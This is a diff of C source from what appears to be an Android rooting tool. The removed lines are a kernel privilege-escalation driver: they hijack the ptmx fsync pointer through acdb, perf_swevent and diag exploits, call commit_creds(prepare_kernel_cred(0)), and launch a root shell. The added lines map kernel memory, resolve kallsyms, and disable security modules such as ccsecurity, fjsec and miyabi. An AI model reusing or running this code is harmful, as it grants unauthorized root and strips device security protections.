@@ -1,118 +1,128 @@
-#include <stdint.h>
-#include <stdbool.h>
+#define _LARGEFILE64_SOURCE
 #include <stdio.h>
 #include <stdlib.h>
-#include <string.h>
-#include <errno.h>
-#define _LARGEFILE64_SOURCE
-#include <sys/types.h>
-#include <unistd.h>
-#include <sys/stat.h>
-#include <fcntl.h>
 
-#include "cred.h"
-#include "mm.h"
-#include "ptmx.h"
-#include "libdiagexploit/diag.h"
-#include "libperf_event_exploit/perf_event.h"
-#include "libmsm_acdb_exploit/acdb.h"
+#include "kernel_memory.h"
+#include "kallsymsprint.h"
+#include "ccsecurity.h"
+#include "reset_security_ops.h"
+#include "lsm_capability.h"
 
-void
-obtain_root_privilege(void)
-{
-  commit_creds(prepare_kernel_cred(0));
-}
+#define CHECK_SYMBOL    "printk"
 
 static bool
-run_obtain_root_privilege(void *user_data)
+check_is_kallsymsprint_working(void)
 {
-  int fd;
+  unsigned long addr;
+  const char *name;
 
-  fd = open(PTMX_DEVICE, O_WRONLY);
-  fsync(fd);
-  close(fd);
+  addr = kallsyms_lookup_name(CHECK_SYMBOL);
+  name = kallsyms_lookup_address(addr);
+
+  if (strcmp(name, CHECK_SYMBOL) != 0) {
+    return false;
+  }
 
   return true;
 }
 
 static bool
-attempt_diag_exploit(unsigned long int address)
+do_unlock(void)
 {
-  struct diag_values injection_data;
+  bool success = false;
 
-  injection_data.address = address;
-  injection_data.value = (uint16_t)&obtain_root_privilege;
+  printf("Checking ccsecurity...\n");
+  if (has_ccsecurity()) {
+    printf("Found ccsecurity.\n");
 
-  return diag_run_exploit(&injection_data, 1,
-                          run_obtain_root_privilege, NULL);
-}
+    if (unlock_ccsecurity()) {
+      goto unlock_success;
+    }
 
-static bool
-attempt_acdb_exploit(unsigned long int address, unsigned long int original_value)
-{
-  if (acdb_run_exploit(address, (int)&obtain_root_privilege,
-                       run_obtain_root_privilege, NULL)) {
-
-    acdb_write_value_at_address(address, original_value);
-
-    return true;
+    goto unlock_failed;
   }
 
+  printf("Checking reset_security_ops...\n");
+  if (has_reset_security_ops()) {
+    printf("Found reset_security_ops. Run it.\n");
+    if (run_reset_security_ops()) {
+      printf("OK.\n\n");
+      success = true;
+    }
+    else {
+      printf("Failed.\n\n");
+    }
+  }
+
+  printf("Checking fjsec LSM...\n");
+  if (has_fjsec_lsm()) {
+    printf("Found fjsec LSM.\n");
+
+    if (unlock_fjsec_lsm()) {
+      goto unlock_success;
+    }
+
+    goto unlock_failed;
+  }
+
+  printf("Checking miyabi LSM...\n");
+  if (has_miyabi_lsm()) {
+    printf("Found miyabi LSM.\n");
+
+    if (unlock_miyabi_lsm()) {
+      goto unlock_success;
+    }
+
+    goto unlock_failed;
+  }
+
+  if (success) {
+    goto unlock_success;
+  }
+
+  printf("\nSecurity module is not found.\n");
   return false;
-}
 
-static bool
-run_exploit(void)
-{
-  unsigned long int ptmx_fsync_address;
-  unsigned long int ptmx_fops_address;
+unlock_failed:
+  printf("Failed unlock LSM.\n");
+  return false;
 
-  ptmx_fops_address = get_ptmx_fops_address();
-  if (!ptmx_fops_address) {
-    return false;
-  }
-
-  ptmx_fsync_address = ptmx_fops_address + 0x38;
-
-  printf("Attempt acdb exploit...\n");
-  if (attempt_acdb_exploit(ptmx_fsync_address, 0)) {
-    return true;
-  }
-  printf("\n");
-
-  printf("Attempt perf_swevent exploit...\n");
-  if (perf_swevent_run_exploit(ptmx_fsync_address, (int)&obtain_root_privilege,
-                                  run_obtain_root_privilege, NULL)) {
-    return true;
-  }
-  printf("\n");
-
-  return attempt_diag_exploit(ptmx_fsync_address);
+unlock_success:
+  printf("\nUnlocked LSM.\n");
+  return true;
 }
 
 int
 main(int argc, char **argv)
 {
-  set_kernel_phys_offset(0x200000);
-  remap_pfn_range = get_remap_pfn_range_address();
-  if (!remap_pfn_range) {
-    printf("You need to manage to get remap_pfn_range addresses.\n");
+  void *mapped_address;
+
+  printf("Mapping kernel memory...\n");
+  if (!map_kernel_memory()) {
+    printf("Failed.\n");
     exit(EXIT_FAILURE);
   }
+  printf("OK.\n\n");
 
-  if (!setup_creds_functions()) {
-    printf("Failed to get prepare_kernel_cred and commit_creds addresses.\n");
-    exit(EXIT_FAILURE);
+  printf("Finding kallsyms address in memory...\n");
+  mapped_address = convert_to_kernel_mapped_address((void *)KERNEL_BASE_ADDRESS);
+  if (get_kallsyms(mapped_address, KERNEL_MEMORY_SIZE)) {
+    printf("Checking kallsyms working...\n");
+
+    if (check_is_kallsymsprint_working()) {
+      printf("OK. Ready to unlock security module.\n\n");
+
+      do_unlock();
+    }
+    else {
+      printf("kallsymsprint doesn't work\n");
+    }
+  }
+  else {
+    printf("Failed: Lookup kallsyms in memory.\n");
   }
 
-  run_exploit();
-
-  if (getuid() != 0) {
-    printf("Failed to obtain root privilege.\n");
-    exit(EXIT_FAILURE);
-  }
-
-  system("/system/bin/sh");
+  unmap_kernel_memory();
 
   exit(EXIT_SUCCESS);
 }
